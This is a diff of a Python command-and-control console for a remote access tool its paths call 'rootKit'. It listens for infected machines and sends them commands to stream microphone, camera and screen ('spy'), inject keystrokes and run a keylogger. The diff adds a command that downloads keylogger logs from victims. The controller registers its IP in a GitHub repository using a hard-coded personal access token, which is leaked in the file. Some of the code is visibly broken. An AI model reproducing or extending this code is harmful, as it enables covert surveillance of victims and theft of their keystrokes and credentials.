@@ -1,4 +1,4 @@
-import socket, os, threading, requests, re, sys, keyboard
+import socket, os, threading, requests, re, sys, keyboard, inspect, shutil
 from os import name
 from vidstream import StreamingServer
 from pyaudio import PyAudio, paInt16
@@ -6,11 +6,118 @@ from time import sleep
 from numpy import array
 from math import *
 from fct import clear as clearWindow
+import fct
 from colored import fg, bg, attr
 from iteration_utilities import duplicates
 from github import Github
 from subprocess import call as supCall
 from math import ceil
+pathDirFile = os.path.realpath(__file__)[:-len(os.path.basename(__file__))-1]+"/"
+ATTR_colored = attr
+githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
+
+class Setup():
+    def __init__(self):
+        self.baseSetupFile = "version\n\nmaterial speed\nhigh\ninternet speed\nhigh\npath File\n\n\n"
+        self.array = {}
+        self.version = ""
+        self.file = "assets/setup.txt"
+        self.line = {"version": 1, "material speed": 3, "internet speed": 5, "cmd.txt": 7, "ip.txt": 8, "help.txt": 9}
+        self.orderFile = ["cmd.txt", "ip.txt", "help.txt"]
+        try:
+            with open(pathDirFile+self.file, "r"):
+                pass
+        except:
+            with open(pathDirFile+self.file, "w") as file:
+                self.createFile()
+        self.changeValue()
+    def createFile(self):
+        with open(pathDirFile+self.file, "w") as file:
+            file.write(self.baseSetupFile)
+    def changeValue(self):
+        with open(pathDirFile+self.file, "r") as file:
+            sort = file.read().split("\n")
+            if len(sort) != len(self.baseSetupFile.split("\n")):
+                self.createFile()
+                self.changeValue()
+            elif sort[self.getLine("material speed")] not in ("low", "medium", "high", "xl-high"):
+                self.changeConfig("high", self.getLine("material speed"))
+            elif sort[self.getLine("internet speed")] not in ("low", "medium", "high", "xl-high"):
+                self.changeConfig("high", self.getLine("internet speed"))
+            else:
+                if sort[self.getLine("material speed")] == "low":
+                    self.setupMultipliersMaterial = 2
+                elif sort[self.getLine("material speed")] == "medium":
+                    self.setupMultipliersMaterial = 1.5
+                elif sort[self.getLine("material speed")] == "high":
+                    self.setupMultipliersMaterial = 1
+                elif sort[self.getLine("material speed")] == "xl-high":
+                    self.setupMultipliersMaterial = 0.5
+                if sort[self.getLine("internet speed")] == "low":
+                    self.setupConnexionSpeed = 2
+                elif sort[self.getLine("internet speed")] == "medium":
+                    self.setupConnexionSpeed = 1.5
+                elif sort[self.getLine("internet speed")] == "high":
+                    self.setupConnexionSpeed = 1
+                elif sort[self.getLine("internet speed")] == "xl-high":
+                    self.setupConnexionSpeed = 0.5
+                for file in self.orderFile:
+                    self.array[file] = sort[self.getLine(file)]
+    def changeConfig(self, data, line, verif=None):
+        # changeConfig("high", 1, ("low", "medium", "high", "xl-high")
+        if verif != None and data not in verif:
+            return None
+        if line == None or len(self.baseSetupFile.split("\n")) < line:
+            return None
+        with open(pathDirFile+self.file, "r") as file:
+            sort = file.read().split("\n")
+            sort[line] = data
+        with open(pathDirFile+self.file, "w") as file:
+            file.write("\n".join(sort))
+        self.changeValue()
+        return True
+    def getLine(self, data):
+        if data not in self.line:
+            return None
+        return self.line[data]
+    def getSpeedMaterialMultiplier(self):
+        return self.setupMultipliersMaterial
+    def getSpeedInternetMultiplier(self):
+        return self.setupConnexionSpeed
+    def getPathFile(self, file, onlyDir=False):
+        if file in self.orderFile:
+            if onlyDir:
+                return self.array[file]
+            return self.array[file]+file
+        else:
+            print(inspect.currentframe().f_lineno)
+            return None
+    def setPathFile(self, newPath, file, line):
+        if len(newPath) > 0 and (newPath[-1] != "/" or newPath[-1] != "\\"):
+            newPath = newPath+"/"
+        oldPath = pathDirFile+self.getPathFile(file, onlyDir=True)
+        if file not in self.orderFile or self.changeConfig(newPath, line) == None:
+            return None
+        newPath = pathDirFile+newPath
+        if not os.path.exists(newPath):
+            os.makedirs(newPath)
+        if os.path.exists(oldPath+file):
+            shutil.move(oldPath+file, newPath+file)
+            if not os.listdir(oldPath):
+                os.rmdir(oldPath)
+            return True
+        return None
+        
+    def getVersion(self):
+        return self.version
+    def setVersion(self, version):
+        self.version = version
+    def getFileName(self):
+        return self.orderFile
+
+setup = Setup()
+setup.setVersion(requests.get(f"{githubUrl}version").text.replace("\n", ""))
+
 def getSelfIp(temp=-1):
     return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
 def connected():
@@ -23,7 +130,7 @@ def connected():
         return False
 if getSelfIp() not in("192.168.249.97") and connected():
     # First create a Github instance:
-    g = Github("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")
+    g = Github("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")
     # Then play with your Github objects:
     # for repo in g.get_user().get_repos():
     #     print(repo.name)
@@ -34,64 +141,14 @@ if getSelfIp() not in("192.168.249.97") and connected():
     except:
         pass
     repo.create_file("rootKit/ip", "create", getSelfIp())
-    with open('ip.txt', "w") as file:
+    with open(pathDirFile+setup.getPathFile('ip.txt'), "w") as file:
         file.write(getSelfIp())
 else:
     print("vous n'étes pas connecter")
     exit()
 
-githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
-reset, sendAndReceive, mythreads, threadConnected, listenIp = attr(0), [], [], [], False
+reset, sendAndReceive, mythreads, threadConnected, listenIp = ATTR_colored(0), [], [], [], False
 
-class Setup():
-    def __init__(self):
-        self.file = "setup.txt"
-        try:
-            with open(self.file, "r"):
-                pass
-        except:
-            with open(self.file, "w") as file:
-                file.write("material speed\nhigh\ninternet speed\nhigh")
-        self.changeValue()
-        
-    def changeValue(self):
-        with open(self.file, "r") as file:
-            sort = file.read().split("\n")
-            if sort[1] == "low":
-                self.setupMultipliersMaterial = 2
-            elif sort[1] == "medium":
-                self.setupMultipliersMaterial = 1.5
-            elif sort[1] == "high":
-                self.setupMultipliersMaterial = 1
-            elif sort[1] == "xl-high":
-                self.setupMultipliersMaterial = 0.5
-            if sort[3] == "low":
-                self.setupConnexionSpeed = 2
-            elif sort[3] == "medium":
-                self.setupConnexionSpeed = 1.5
-            elif sort[3] == "high":
-                self.setupConnexionSpeed = 1
-            elif sort[3] == "xl-high":
-                self.setupConnexionSpeed = 0.5
-    def changeConfig(self, material=None, internet=None):
-        with open(self.file, 'r') as file:
-            sort = file.read().split("\n")
-            tempSpeedMaterial = sort[1]
-            tempSpeedConnexion = sort[3]
-        with open(self.file, "w") as file:
-            if material in ("low", "medium", "high", "xl-high"):
-                tempSpeedMaterial = material
-            if internet in ("low", "medium", "high", "xl-high"):
-                tempSpeedConnexion = internet
-            file.write("material speed\n"+tempSpeedMaterial+"\ninternet speed\n"+tempSpeedConnexion)
-    def GetSpeedMaterialMultiplier(self):
-        return self.setupMultipliersMaterial
-    def GetSpeedInternetMultiplier(self):
-        return self.setupConnexionSpeed
-
-setup = Setup()
-print(setup.GetSpeedMaterialMultiplier())
-print(setup.GetSpeedInternetMultiplier())
 
 class Microphone(threading.Thread):
     def __init__(self, ip, port):
@@ -141,6 +198,7 @@ class Microphone(threading.Thread):
 class myThread(threading.Thread):
     def __init__(self,ip,port, ID, con, init): 
         threading.Thread.__init__(self)
+        # print(super.myThread())
         self.INIT = {}
         for i in range(0, len(init), 2):
             self.INIT[init[i]] = init[i+1]
@@ -202,7 +260,17 @@ class myThread(threading.Thread):
     def send(self, data):
         data.replace("9", "8+1")
         self.con.sendall(data.encode())
-        sleep(0.05*setup.GetSpeedInternetMultiplier())
+        sleep(0.05*setup.getSpeedInternetMultiplier())
+    def timeout(self, time):
+        self.con.settimeout(time)
+    def getTimeout(self):
+        return self.con.gettimeout()
+    def receive(self, size=128, timeout=1):
+        try:
+            self.timeout(timeout)
+            return self.con.recv(size).decode()
+        except:
+            return None
     def stop(self):
         self.Stop = True
     def getCon(self):
@@ -344,7 +412,7 @@ def MainThread():
     while getattr(mainThread, "do_run", True):
         try:
             ID+=1
-            s.settimeout(1*setup.GetSpeedInternetMultiplier()*setup.GetSpeedMaterialMultiplier())
+            s.settimeout(1*setup.getSpeedInternetMultiplier()*setup.getSpeedMaterialMultiplier())
             s.listen(1) 
             # print("Serveur: en attente de connexions des clients TCP ...")
             (con, (ip,port)) = s.accept()
@@ -362,33 +430,28 @@ mainThread = threading.Thread(target=MainThread)
 mainThread.daemon = True
 mainThread.start()
 
-def TrueFalseColor(bool):
+def TrueFalseColor(bool, returnWithColor = None):
+    if not returnWithColor:
+        if bool:
+            return fg(2)+str(bool)+reset
+        return fg(1)+str(bool)+reset
     if bool:
-        return fg(2)+str(bool)+reset
-    return fg(1)+str(bool)+reset
+        return fg(2)+returnWithColor+reset
+    return fg(1)+returnWithColor+reset
 def getByGithub(url):
         return requests.get(f"{url}").text
-def terminal_size(columns=None, lines=None):
-    if columns or lines:
-        if name == 'posix':
-            if columns:
-                supCall(['stty', 'cols', str(columns)], shell=True)
-            if lines:
-                supCall(['stty', 'rows', str(lines)], shell=True)
-        else:
-            if columns:
-                supCall(['mode', 'con:', 'cols={}'.format(columns)], shell=True)
-            if lines:
-                supCall(['mode', 'con:', 'lines={}'.format(lines)], shell=True)
-    return (((("".join("".join(str(os.get_terminal_size()).split("(")[1]).split(")"))).replace("=", "")).replace("columns", "")).replace("lines", "").split(","))
 def writeMiddle(data):
-    return f"{int(ceil(int(terminal_size()[0])/2)-ceil(len(stopSpaceError(data))/2))*' '+stopSpaceError(data)}"
+    return f"{int(ceil(int(fct.terminal_size()[0])/2)-ceil(len(stopSpaceError(data))/2))*' '+stopSpaceError(data)}"
 def writeFloat(left="", right="", leftLen=None, rightLen=None):
+    if type(leftLen) == str:
+        leftLen = len(leftLen)
+    if type(rightLen) == str:
+        rightLen = len(rightLen)
     if not leftLen:
         leftLen = len(left)
     if not rightLen:
         rightLen = len(right)
-    return f"{left}{(int(terminal_size()[0])-leftLen-rightLen)*' '}{right}"
+    return f"{left}{(int(fct.terminal_size()[0])-leftLen-rightLen)*' '}{right}"
 def initHelp(file):
     help = {}
     with open(file, 'r') as file:
@@ -400,7 +463,7 @@ def initHelp(file):
                     temp, stop = stopSpaceError(line), False
                 if not stop:
                     if first:
-                        sort += f"{fg(40)}{attr(1)}{writeMiddle(line)}{reset}\n"
+                        sort += f"{fg(40)}{ATTR_colored(1)}{writeMiddle(line)}{reset}\n"
                         first = False
                     else:
                         sort += writeMiddle(line)+'\n'
@@ -408,8 +471,8 @@ def initHelp(file):
     return help
 def HELP(nameDict=None):
     if nameDict:
-        return initHelp('help.txt')[nameDict]
-    return initHelp('help.txt')
+        return initHelp(pathDirFile+setup.getPathFile('help.txt'))[nameDict]
+    return initHelp(pathDirFile+setup.getPathFile('help.txt'))
 def send(data, THREAD=None):
     global addvar, run
     thread = getConnected.getCurrentThreads()
@@ -453,8 +516,8 @@ def threadingSendAndReceive(dataToSend, ip, port, thread):
         rest=False
     if rest:
         try:
-            thread.getCon().settimeout(4*setup.GetSpeedInternetMultiplier())
-            print(thread.getCon().recv(64000))
+            thread.getCon().settimeout(4*setup.getSpeedInternetMultiplier())
+            print(thread.receive(size=64000))
         except:
             print(f'no return in {ip}:{port}')
         
@@ -467,7 +530,7 @@ def runThreadingSendAndReceive(data):
         t.daemon = True
         t.start()
         loop+=1
-    sleep(5*setup.GetSpeedInternetMultiplier())
+    sleep(5*setup.getSpeedInternetMultiplier())
 
 def testIfIpTrue(data, total=False):
     if total == False:
@@ -492,7 +555,7 @@ def restart(timeout=2):
             thread.send('left')
         except:
             pass
-    sleep(timeout*setup.GetSpeedInternetMultiplier())
+    sleep(timeout*setup.getSpeedInternetMultiplier())
     mainThread = threading.Thread(target=MainThread)
     mainThread.daemon = True
     mainThread.start()
@@ -527,9 +590,9 @@ def supLine(filename, line_to_delete):
     f.close()
     
 def printFileCmd():
-    filename = "cmd.txt"
+    filename = pathDirFile+setup
     testEmptyLine(filename)
-    with open(filename) as fp:
+    with open(pathDirFile+filename) as fp:
         sort = fp.read()
         if sort:
             sort = sort.split('\n')
@@ -550,7 +613,7 @@ def inputcolor(color=255, attribut=None, content="", preset=None):
         ret = inputcolor(color=preset[numPreset][0], attribut=preset[numPreset][1], content=preset[numPreset][2])
         return ret
     else:
-        return input(fg(color)+attr(attribut)+content+reset)
+        return input(fg(color)+ATTR_colored(attribut)+content+reset)
 
 def retLineCmd(filename, numberline):
     with open(filename) as fp:
@@ -568,7 +631,7 @@ def printSocketCo():
         print()
         print()
         command('list')
-        sleep(3*setup.GetSpeedMaterialMultiplier())
+        sleep(3*setup.getSpeedMaterialMultiplier())
 def testin(data, *cmd):
     for command in cmd:
         if data == command:
@@ -581,11 +644,11 @@ def displayContinueSocket(stop):
     actuel = ""
     pause = False
     while True:
-        for con in getConnected.getCon():
+        for thread in getConnected.getCurrentThreads():
+            con = thread.getCon()
             try:
                 if not pause:
-                    con.settimeout(0.01*setup.GetSpeedInternetMultiplier())
-                    receive = con.recv(5).decode()
+                    receive = thread.receive(size=5, timeout=0.01*setup.getSpeedInternetMultiplier())
                     if receive:
                         delete = 0
                         if receive == "x/332":
@@ -597,7 +660,7 @@ def displayContinueSocket(stop):
                         else:
                             DICT[con] = [DICT[con][0], DICT[con][1]+receive]
                         if DICT[con][0] != actuel and actuel != "":
-                            DICT[con] = [DICT[con][0], DICT[con][1]+"\n"]
+                            print()
                         sys.stdout.flush() # Pour raffraichir l'affichage
                         sys.stdout.write(chr(13)) # Retour chariot
                         sys.stdout.write(' '*(len(DICT[con][0]+": "+DICT[con][1])+delete)) # Efface la ligne. Comprendre 100 > 99 = 1 caractere de moins
@@ -609,9 +672,52 @@ def displayContinueSocket(stop):
         if stop():
             break
     print()
+def recieveAndWritteFile(thread): 
+    # ! continuer ici pour le keylogger
+    with open(pathDirFile+"log/"+thread.getName()+"_log.txt", "w"):
+        pass
+    with open(pathDirFile+"log/"+thread.getName()+"_log.txt", 'a') as file:
+        while True:
+            recv = thread.receive(size = 128)
+            if recv == None or len(recv) < 3:
+                break
+            elif recv[-3:] == "end":
+                file.write(recv[:-3])
+                break
+            else:
+                file.write(recv)
+
         
-        
+
 # ! main
+
+def setupCommand(data):
+    data = data.lower()
+    data = stopSpaceError(data)
+    datalist = data.split()
+    try:
+        if testin(data, "help"):
+            print(HELP("setup commands"))
+        elif testin(datalist[0], "changepath"):
+            if datalist[1] in setup.getFileName():
+                if len(datalist) == 2:
+                    print("test")
+                    datalist.append("")
+                print(datalist)
+                print("successful") if setup.setPathFile(datalist[2], datalist[1], setup.getLine(datalist[1])) == True else print("error")
+            else:
+                print("file not found")
+        elif testin(datalist[0], "changeconfig"):
+            if datalist[1] == "internet":
+                print("successful") if setup.changeConfig(datalist[2], setup.getLine("internet speed"), ("low", "medium", "high", "xl-high")) != None else print("not a good parameter")
+            elif datalist[1] == "material":
+                print("successful") if setup.changeConfig(datalist[2], setup.getLine("material speed"), ("low", "medium", "high", "xl-high")) != None else print("not a good parameter")
+    except Exception as e:
+        print(e)
+        print("error")
+        
+
+
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
@@ -677,7 +783,7 @@ def command(commandToExecute):
             clear()
         elif testin(commandToExecute, "help", "aide"):
             try:
-                print(fg(40)+attr(1)+int(terminal_size()[0])*"_"+"\n"+reset+HELP('local command'))
+                print(fg(40)+ATTR_colored(1)+int(fct.terminal_size()[0])*"_"+"\n"+reset+HELP('local command'))
             except:
                 print('aucune aide ici...')
             command(inputcolor(preset=1))
@@ -691,8 +797,16 @@ def command(commandToExecute):
                 except Exception as e:
                     print(e)
                     pass
-        elif testin(commandToExecute, 'setting', 'param', 'parameter'):
-            4
+        elif testin(commandToExecute, 'setting', 'param', 'parameter', "setup"):
+            clear()
+            version = setup.getVersion()
+            print(writeFloat(f'{fg(5)+ATTR_colored(1)}setup{reset}', "version: "+TrueFalseColor(version != "404: Not Found", version), leftLen = len("setup"), rightLen = "version: "+version))
+            while True:
+                data = input(fg(4)+ATTR_colored(1)+">"+reset)
+                if testin(data, "stop", "quit"):
+                    break
+                setupCommand(data)
+            clear()
         elif testin(commandToExecute, "clear", "cleared", "cls", "restart"):
             print('cleared')
             clear()
@@ -703,9 +817,9 @@ def command(commandToExecute):
             OK = False
             for thread in getAll.getCurrentThreads():
                 OK = True
-                print(f"{fg(40)}{attr(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
+                print(f"{fg(40)}{ATTR_colored(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
             if not OK:
-                print(f'{fg(1)}{attr(1)}aucune connexion active...{reset}')
+                print(f'{fg(1)}{ATTR_colored(1)}aucune connexion active...{reset}')
         elif testin(commandToExecute, "command"):
             runCommand = True
             registerCmdAcces("help")
@@ -725,14 +839,14 @@ def registerCmdAcces(data):
     dataList = data.split()
     try:
         if testin(dataList[0], "register", "enregistre"):
-            customcmd = open("cmd.txt", "a")
+            customcmd = open(pathDirFile+setup.getPathFile("cmd.txt"), "a")
             temp = "\n"+" ".join(dataList[1:len(dataList)])
             customcmd.write(temp)
             customcmd.close()
             print('the command '+temp.replace('\n', '')+' as been create successfuly')
         elif testin(data, "help", "clear", "cls"):
             clear()
-            print(fg(40)+attr(1)+writeMiddle("your in the cmd space")+reset)
+            print(fg(40)+ATTR_colored(1)+writeMiddle("your in the cmd space")+reset)
             print()
             try:
                 print(HELP('custom cmd command'))
@@ -749,10 +863,10 @@ def registerCmdAcces(data):
         elif testin(dataList[0], "sup", "del"):
             if len(dataList) > 2 and dataList[2].isdigit() == True:
                 dataList[2] = int(dataList[2])
-                supLine("cmd.txt", dataList[2])
+                supLine(pathDirFile+setup.getPathFile("cmd.txt"), dataList[2])
             elif len(dataList) > 1 and dataList[1].isdigit() == True:
                 dataList[1] = int(dataList[1])
-                supLine("cmd.txt", dataList[1])
+                supLine(pathDirFile+setup.getPathFile("cmd.txt"), dataList[1])
             else:
                 print("no int write")
         else:
@@ -790,15 +904,15 @@ def sendData(data, RETURN=False):
                     if RETURN:
                         ret.append(f"{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                     else:
-                        print(f"{fg(40)}{attr(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
+                        print(f"{fg(40)}{ATTR_colored(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                     OK = True
                 if not OK:
-                    print(f'{fg(1)}{attr(1)}aucune connexion active...{reset}')
+                    print(f'{fg(1)}{ATTR_colored(1)}aucune connexion active...{reset}')
                 if RETURN:
                     return ret
             elif testin(data, "help", "aide"):
                 try:
-                    print(fg(40)+attr(1)+int(terminal_size()[0])*"_"+"\n"+reset+HELP('sending command'))
+                    print(fg(40)+ATTR_colored(1)+int(fct.terminal_size()[0])*"_"+"\n"+reset+HELP('sending command'))
                 except:
                     print('aucune aide ici...')
             elif testin(datalist[0], "severalcmd"):
@@ -808,7 +922,7 @@ def sendData(data, RETURN=False):
             elif testin(data, "command"):
                 runCommand = True
                 clear()
-                print(fg(40)+attr(1)+"your in the cmd space"+reset)
+                print(fg(40)+ATTR_colored(1)+"your in the cmd space"+reset)
                 registerCmdAcces("help")
                 while runCommand == True:
                     registerCmdAcces(inputcolor(preset=1))
@@ -824,10 +938,10 @@ def sendData(data, RETURN=False):
             elif testin(datalist[0], "command"):
                 if len(datalist) > 2 and datalist[2].isdigit() == True:
                     datalist[2] = int(datalist[2])
-                    sendData(retLineCmd("cmd.txt", datalist[2]))
+                    sendData(retLineCmd(pathDirFile+setup.getPathFile("cmd.txt"), datalist[2]))
                 elif len(datalist) > 1 and datalist[1].isdigit() == True:
                     datalist[1] = int(datalist[1])
-                    sendData(retLineCmd("cmd.txt", datalist[1]))
+                    sendData(retLineCmd(pathDirFile+setup.getPathFile("cmd.txt"), datalist[1]))
                 else:
                     if data == 'command':
                         runCommand = True
@@ -857,15 +971,15 @@ def sendData(data, RETURN=False):
                 micStop(reload=True)
             elif testin(data, "spy"):
                 sendData("startmic")
-                sleep(0.5*setup.GetSpeedInternetMultiplier())
+                sleep(0.5*setup.getSpeedInternetMultiplier())
                 sendData("cameraStart")
-                sleep(0.5*setup.GetSpeedInternetMultiplier())
+                sleep(0.5*setup.getSpeedInternetMultiplier())
                 sendData("screenStart")
             elif testin(data, 'spyStop'):
                 sendData("micStop")
-                sleep(0.5*setup.GetSpeedInternetMultiplier())
+                sleep(0.5*setup.getSpeedInternetMultiplier())
                 sendData("cameraStop")
-                sleep(0.5*setup.GetSpeedInternetMultiplier())
+                sleep(0.5*setup.getSpeedInternetMultiplier())
                 sendData("screenStop")
             elif testin(datalist[0], "fasttap", "fastTap", "tapfast", "tapFast"):
                 datalist.pop(0)
@@ -909,6 +1023,36 @@ def sendData(data, RETURN=False):
                 send("listenKeyloggerFalse")
                 stop_display_continue_socket = True
                 threadingDisplayAll.join()
+            elif testin("dlLogFile", datalist[0]):
+                try:
+                    os.mkdir(pathDirFile+"\\log")
+                except:
+                    pass
+                received = False
+                for thread in getConnected.getCurrentThreads():
+                    if datalist[1] == "all":
+                        thread.send("sendFileKeylogger")
+                        recieveAndWritteFile(thread)
+                        print("receive from", thread.getName())
+                        sleep(0.5*setup.getSpeedInternetMultiplier())
+                        received = None
+                    elif (thread.getName() == datalist[1]) or (thread.getIp() == datalist[1]) or (thread.getFullIp() == datalist[1]):
+                        thread.send("sendFileKeylogger")
+                        recieveAndWritteFile(thread)
+                        received = True
+                        print("file is received from "+thread.getName())
+                        break
+                if received != None and not received:
+                    print("connexion not found")
+            elif testin(datalist[0], "printInfoCon"):
+                if len(datalist) == 1:
+                    for thread in getConnected.getCurrentThreads():
+                        print(thread.getName()+":", thread.getFullIp())
+                elif testin(datalist[1], "admin", "dev", "all"):
+                    for thread in getConnected.getCurrentThreads():
+                        print(thread.getName()+":", thread.getFullIp(), thread.getId(), "\n", thread.getCurrentThreads(), "\n", thread.getCon(), "timeout:", thread.getTimeout(), "\nscreen:", thread.screenIsAlive(), thread.getPortScreen(), "\ncamera:", thread.cameraIsAlive(), thread.getPortScreen(), "\nmicrophone:", thread.micLives(), thread.getPortMic(), "\n")
+                else:
+                    print("arguments dosn't exist")
             elif testin(data, "showInitInfo"):
                 for thread in getConnected.getCurrentThreads():
                     # print(thread.getName()+": "+thread.showInitInfo())
@@ -951,7 +1095,7 @@ def micStop(MYTHREADS=mythreads, reload=False):
             # print('mic stop')
         except:
             pass
-        sleep(0.2*setup.GetSpeedInternetMultiplier())
+        sleep(0.2*setup.getSpeedInternetMultiplier())
         if reload:
             try:
                 thread.micStart(thread.getPortMic())
@@ -1016,7 +1160,7 @@ while progrun:
             affichage = ", ".join(affiche)
             if list(duplicates(affiche)):
                 affichage = ", ".join(afficheIpPortConnected)
-            sendData(input(fg(127)+attr(1)+affichage+">"+reset))
+            sendData(input(fg(127)+ATTR_colored(1)+affichage+">"+reset))
         else:
             run = False
             print('tout les socket sont fermer')
@@ -1030,4 +1174,5 @@ while progrun:
         pass
 
 mainThread.do_run = False
+fct.endingCode()
 exit()
